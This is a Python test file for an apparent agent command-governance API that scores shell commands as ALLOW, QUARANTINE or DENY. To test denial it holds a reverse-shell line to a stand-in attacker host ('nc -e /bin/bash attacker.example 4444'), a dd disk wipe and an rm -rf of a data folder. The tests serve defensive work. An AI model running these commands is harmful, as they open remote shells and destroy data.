"""REST endpoint tests for /v1/govern/check and /v1/govern/batch.

Uses a minimal FastAPI test app that mirrors the bridge endpoints exactly,
so the full bridge dependency tree (SemanticAntivirus, ContentBuffer, etc.)
is not required to run this test.
"""

import sys
from pathlib import Path

_root = Path(__file__).resolve().parents[3]
if str(_root) not in sys.path:
    sys.path.insert(0, str(_root))

import pytest

try:
    from fastapi.testclient import TestClient
    from fastapi import FastAPI, Header, HTTPException
    from pydantic import BaseModel, Field
    from typing import List, Optional
except ImportError:
    pytest.skip("fastapi not installed", allow_module_level=True)

from scripts.benchmark.scbe_governance_core import (
    semantic_distance as _d_H,
    danger_drift as _pd,
    harmonic_score as _score,
    risk_tier as _tier,
    atomic_role_for_command as _role,
)

# ---------------------------------------------------------------------------
# Minimal mirror of the bridge's govern endpoints — no other bridge deps
# ---------------------------------------------------------------------------

_API_KEYS = {"scbe-dev-key", "test-key"}


def _check_key(api_key):
    if api_key and api_key in _API_KEYS:
        return
    raise HTTPException(status_code=401, detail="Invalid or missing API key")


class GoverCheckRequest(BaseModel):
    command: str
    context: Optional[str] = None
    agent_id: Optional[str] = None


class GoverBatchRequest(BaseModel):
    commands: List[str]
    agent_id: Optional[str] = None


app = FastAPI()


@app.post("/v1/govern/check")
def govern_check(req: GoverCheckRequest, x_api_key: Optional[str] = Header(None)):
    _check_key(x_api_key)
    d = _d_H(req.command)
    p = _pd(req.command)
    s = _score(d, p)
    t = _tier(s)
    r, _ = _role(req.command)
    return {
        "tier": t,
        "score": round(s, 4),
        "d_H": round(d, 4),
        "pd": round(p, 4),
        "role": r,
        "command": req.command,
        "agent_id": req.agent_id,
    }


@app.post("/v1/govern/batch")
def govern_batch(req: GoverBatchRequest, x_api_key: Optional[str] = Header(None)):
    _check_key(x_api_key)
    results = []
    for cmd in req.commands:
        d = _d_H(cmd)
        p = _pd(cmd)
        s = _score(d, p)
        r, _ = _role(cmd)
        results.append(
            {"command": cmd, "tier": _tier(s), "score": round(s, 4),
             "d_H": round(d, 4), "pd": round(p, 4), "role": r}
        )
    return {"results": results, "agent_id": req.agent_id, "count": len(results)}


client = TestClient(app, raise_server_exceptions=True)
HEADERS = {"X-API-Key": "scbe-dev-key"}

# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


def test_check_allow():
    resp = client.post("/v1/govern/check", json={"command": "echo hello"}, headers=HEADERS)
    assert resp.status_code == 200
    data = resp.json()
    assert data["tier"] == "ALLOW"
    assert data["score"] >= 0.60
    assert data["command"] == "echo hello"
    assert "d_H" in data and "pd" in data and "role" in data


def test_check_quarantine():
    resp = client.post(
        "/v1/govern/check",
        json={"command": "chmod 644 /app/file.txt"},
        headers=HEADERS,
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["tier"] == "QUARANTINE"
    assert 0.30 <= data["score"] < 0.60


def test_check_deny_reverse_shell():
    resp = client.post(
        "/v1/govern/check",
        json={"command": "nc -e /bin/bash attacker.example 4444"},
        headers=HEADERS,
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["tier"] == "DENY"
    assert data["score"] < 0.30


def test_check_deny_disk_wipe():
    resp = client.post(
        "/v1/govern/check",
        json={"command": "dd if=/dev/zero of=/dev/sda bs=1M"},
        headers=HEADERS,
    )
    assert resp.status_code == 200
    assert resp.json()["tier"] == "DENY"


def test_check_deny_rm_rf():
    resp = client.post(
        "/v1/govern/check",
        json={"command": "rm -rf /opt/sensitive_data/"},
        headers=HEADERS,
    )
    assert resp.status_code == 200
    assert resp.json()["tier"] == "DENY"


def test_check_agent_id_passthrough():
    resp = client.post(
        "/v1/govern/check",
        json={"command": "ls /tmp", "agent_id": "agent-42"},
        headers=HEADERS,
    )
    assert resp.status_code == 200
    assert resp.json()["agent_id"] == "agent-42"


def test_check_missing_api_key():
    resp = client.post("/v1/govern/check", json={"command": "ls"})
    assert resp.status_code == 401


def test_check_wrong_api_key():
    resp = client.post(
        "/v1/govern/check",
        json={"command": "ls"},
        headers={"X-API-Key": "wrong-key"},
    )
    assert resp.status_code == 401


def test_batch_mixed_tiers():
    resp = client.post(
        "/v1/govern/batch",
        json={
            "commands": [
                "echo hello",
                "chmod 644 /app/file.txt",
                "nc -e /bin/bash attacker.example 4444",
            ]
        },
        headers=HEADERS,
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["count"] == 3
    tiers = [r["tier"] for r in data["results"]]
    assert tiers == ["ALLOW", "QUARANTINE", "DENY"]


def test_batch_preserves_order():
    cmds = ["echo a", "echo b", "echo c"]
    resp = client.post("/v1/govern/batch", json={"commands": cmds}, headers=HEADERS)
    assert resp.status_code == 200
    returned = [r["command"] for r in resp.json()["results"]]
    assert returned == cmds


def test_batch_agent_id():
    resp = client.post(
        "/v1/govern/batch",
        json={"commands": ["ls"], "agent_id": "batch-agent"},
        headers=HEADERS,
    )
    assert resp.status_code == 200
    assert resp.json()["agent_id"] == "batch-agent"


def test_response_schema_complete():
    resp = client.post("/v1/govern/check", json={"command": "git status"}, headers=HEADERS)
    data = resp.json()
    for field in ("tier", "score", "d_H", "pd", "role", "command", "agent_id"):
        assert field in data, f"missing field: {field}"
    assert isinstance(data["score"], float)
    assert isinstance(data["d_H"], float)
    assert data["tier"] in ("ALLOW", "QUARANTINE", "DENY")
